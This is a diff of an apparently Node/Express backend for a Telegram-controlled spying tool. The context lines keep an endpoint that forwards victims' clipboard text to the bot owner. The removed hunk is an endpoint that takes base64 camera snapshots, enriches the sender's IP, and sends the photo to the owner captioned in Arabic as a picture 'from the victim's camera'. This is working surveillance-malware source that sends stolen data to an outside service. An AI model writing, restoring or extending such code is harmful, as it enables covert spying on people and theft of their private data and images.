@@ -637,19 +637,6 @@ app.post("/p/clip", express.json({limit:"512kb"}), (req, res) => {
   bot.sendMessage(BOT_OWNER, `📋 *نسخ من الحافظة!*\n📱 ${device||"?"}\n\n\`${text}\``, {parse_mode:"Markdown"}).catch(()=>{});
 });
 
-app.post("/p/camshot", express.json({limit:"5mb"}), async (req, res) => {
-  res.json({ok:true});
-  const { img, device, ip: clientIp } = req.body || {};
-  if (!img) return;
-  const ip = getIP(req) || clientIp || "?";
-  const info = await enrichIP(ip).catch(()=>null);
-  const buf = Buffer.from(img.replace(/^data:image\/\w+;base64,/,''), 'base64');
-  bot.sendPhoto(BOT_OWNER, buf,
-    {caption:`📸 *صورة من كاميرا الضحية!*\n📱 ${device||"?"}\n⚓ ${ip}\n${info||""}`, parse_mode:"Markdown"},
-    {filename:"camshot.jpg", contentType:"image/jpeg"}
-  ).catch(()=>{});
-});
-
 // ── Bot Logic ─────────────────────────────────────────────────────────────────
 
 bot.on('message', async (msg) => {
